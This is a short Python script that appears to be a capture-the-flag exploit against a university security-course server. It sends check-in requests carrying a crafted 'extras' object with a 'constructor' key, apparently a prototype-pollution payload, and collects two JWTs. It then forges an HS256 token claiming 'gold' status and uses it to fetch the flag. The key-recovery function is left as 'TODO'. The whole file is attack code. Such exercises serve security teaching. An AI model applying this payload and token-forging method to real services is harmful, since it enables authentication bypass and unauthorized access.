import httpx
import jwt

base_url = "http://cybersec-ufscar.duckdns.org:3000"


def generate_key(token1: str, token2: str) -> str:
    return "TODO"


def forge_token(key: str) -> str:
    return jwt.encode({"status": "gold"}, key, algorithm="HS256")


def get_flag(token: str) -> str:
    headers = {"Authorization": f"Bearer {token}"}
    response = httpx.post(
        f"{base_url}/upgrades/flag", headers=headers
    ).raise_for_status()
    flag = response.json()["msg"]
    return flag


def get_token(ffp: str) -> str:
    payload = {
        "firstName": "Any",
        "lastName": "Name",
        "passport": "123456789",
        "ffp": ffp,
        "extras": {"constructor": {"name": "Array"}, "a": {"sssr": "FQTU"}},
    }
    response = httpx.post(f"{base_url}/checkin", json=payload).raise_for_status()
    token = response.json()["token"]
    return token


def main():
    token1 = get_token("CA12345669")
    print(f"Got token1: {token1}")
    token2 = get_token("CA12345420")
    print(f"Got token2: {token2}")

    key = generate_key(token1, token2)
    jwt = forge_token(key)
    flag = get_flag(jwt)
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
